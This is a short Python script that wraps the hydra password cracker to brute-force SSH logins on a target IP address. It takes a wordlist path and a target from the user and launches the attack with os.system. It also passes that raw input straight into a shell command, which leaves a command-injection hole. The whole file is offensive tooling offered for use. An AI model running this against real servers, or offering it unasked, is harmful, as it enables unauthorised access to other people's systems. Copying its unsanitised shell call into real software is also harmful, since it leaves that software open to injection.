import os


def ssh(wrdList, Host):
      os.system('hydra -L ' + wrdList + ' -P ' + wrdList + ' ' + Host + ' ssh')




path = input("Enter the path of the Wordlist: ")
print("------------------------------------------")
print("Path set to: " + path)
print("------------------------------------------")
input("Press enter to continue")

os.system('clear')

ip = input("Enter Target ip: ")
print("------------------------------------------")
print("Set ip to: " + ip)
print("------------------------------------------")
input("Press enter to start attack")

os.system('clear')


ssh(path, ip)
